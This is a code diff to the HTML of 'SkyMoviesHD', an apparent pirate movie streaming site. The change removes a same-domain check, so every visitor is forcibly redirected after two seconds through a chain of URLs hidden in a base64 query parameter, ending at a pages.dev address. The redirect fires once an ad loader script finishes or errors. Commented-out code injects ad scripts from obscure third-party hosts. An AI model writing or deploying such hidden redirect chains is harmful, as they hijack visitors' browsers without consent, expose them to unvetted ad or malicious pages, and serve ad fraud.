@@ -1,3 +1,4 @@
+
 <html lang="en"><head>
     <title>SkyMoviesHD & SkyMoviesHD – Watch and Download Free HD Movies Online</title>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
@@ -52,33 +53,28 @@ if (!orderParam) {
   order = atob(orderParam).split(',');
 }
 
-const currentDomain = window.location.origin + '/';
+const adScript = document.getElementById('AdsCoreLoader97547');
 
-if (order[index] === currentDomain) {
-  const adScript = document.getElementById('AdsCoreLoader97547');
-
-  function handleRedirect() {
-    setTimeout(() => {
-      if (index < order.length - 1) {
-        index++;
-        const orderStr = btoa(order.join(','));
-        const nextUrl = order[index] + '?order=' + orderStr + '&index=' + index;
-        window.location.href = nextUrl;
-      } else {
-        window.location.href = 'https://testss-3c9.pages.dev/';
-      }
-    }, 2000);
-  }
-
-  if (adScript) {
-    adScript.addEventListener('load', handleRedirect);
-    adScript.addEventListener('error', handleRedirect);
-  } else {
-    // Fallback if script not found
-    handleRedirect();
-  }
+function handleRedirect() {
+  setTimeout(() => {
+    if (index < order.length - 1) {
+      index++;
+      const orderStr = btoa(order.join(','));
+      const nextUrl = order[index] + '?order=' + orderStr + '&index=' + index;
+      window.location.href = nextUrl;
+    } else {
+      window.location.href = 'https://testss-3c9.pages.dev/';
+    }
+  }, 2000);
 }
-// If not the current step, do nothing, just show the page
+
+if (adScript) {
+  adScript.addEventListener('load', handleRedirect);
+  adScript.addEventListener('error', handleRedirect);
+} else {
+  // Fallback if script not found
+  handleRedirect();
+}
 </script>
 <!--     <script>(function(s){s.dataset.zone='10190027',s.src='https://gizokraijaw.net/vignette.min.js'; s.addEventListener('load', onScriptLoad); s.addEventListener('error', onScriptLoad);})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
     <script>(function(s){s.dataset.zone='10190030',s.src='https://groleegni.net/vignette.min.js'; s.addEventListener('load', onScriptLoad); s.addEventListener('error', onScriptLoad);})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
